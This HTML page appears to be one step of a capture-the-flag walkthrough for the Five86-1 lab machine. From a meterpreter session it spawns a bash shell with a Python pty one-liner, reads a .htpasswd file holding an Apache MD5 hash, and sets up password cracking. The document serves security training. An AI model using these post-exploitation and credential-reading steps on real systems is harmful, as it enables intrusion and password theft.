<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.3 Python on-liner</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><a name="h2-1"></a><strong><h2>4.3 Python on-liner</h2></strong><br /><br />More info <a href="https://wiki.python.org/moin/Powerful%20Python%20One-Liners">here</a>.<br /><br />From the previous step we're on a “meterpreter” in the Victime Machine.<br /><br />a) Type the following commands.<br /><br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;shell<br />python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span>&nbsp;</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">Process 1929 created.<br />Channel 2 created.</span><br /><span style="background-color:#000000;">www-data@five86-1:/opt/ona/www$ </span><br /><br /><br /><div class="codebox"><div class="codebox">www-data@five86-1<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ona<span style="color:#ff9d00;font-weight:700">/</span>www$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br /><br /><br />b) As “www-data” user we can go to the "/var/www directory.<br /><div class="codebox"><div class="codebox">www-data@five86-1<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ona<span style="color:#ff9d00;font-weight:700">/</span>www$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<br />www-data@five86-1<span style="color:#ff9d00;font-weight:700">:/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ona<span style="color:#ff9d00;font-weight:700">/</span>www$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-lsa</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/138-1.png" alt="images/138-1.png" /><br /><br />c) Show the “htpasswd” file content.<br /><br /><div class="codebox"><div class="codebox">www-data@five86-1<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;.htpawwed</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/138-2.png" alt="images/138-2.png" /><br /><br />You can see there's a:<br />MD5       <br />"$apr1$" + the result of an Apache-specific algorithm using an iterated (1,000 times) MD5 digest of various combinations of a random 32-bit salt and the password. See the APR source file  <a href="http://svn.apache.org/viewvc/apr/apr/trunk/crypto/apr_md5.c?view=markup">apr_md5.c</a>  for the details of the algorithm.<br /><br />Reading .htapasswd file we found hashes  for user “douglas”. In the .htapsswd file, the author has left a hint  for the password as shown in the image.<br /><br /><span style="color:#ffa500;">* use the following character set for this 10 character password: aefhrt</span><br /><br /><br />We've found that the password is a 10-character “aefhrt” string, so you’ll need to prepare a 10-character long password dictionary.<br /><br />d) Save the password oon your Kali Machine in a file called “hash” with your favourite text editor.<br /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>